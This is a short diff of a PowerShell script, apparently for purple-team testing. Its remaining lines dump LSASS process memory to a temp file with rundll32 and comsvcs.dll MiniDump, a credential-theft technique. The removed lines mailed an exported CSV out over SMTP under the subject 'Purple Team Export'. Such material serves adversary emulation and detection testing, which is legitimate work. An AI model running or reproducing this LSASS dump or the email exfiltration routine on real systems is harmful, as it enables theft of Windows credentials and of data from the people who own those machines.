@@ -22,18 +22,3 @@ $results |
 
 $lsassPID = (Get-Process -Name lsass).Id
 cmd.exe /c "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Windows\Temp\lsass.dmp full"
-
-!$smtpServer = ""
-!$from =""
-!$to = ""
-
-!$smtp = New-Object Net.Mail.SmtpClient($smtpServer)
-!$msg = New-Object Net.Mail.MailMessage
-!$msg.From = $from
-!$msg.To.Add($to)
-!$msg.Subject = "Purple Team Export"
-!$msg.Body = "Purple Team Test Export"
-!$msg.Attachments.Add("$env:temp\export.csv")
-
-
-!$smtp.Send($msg)
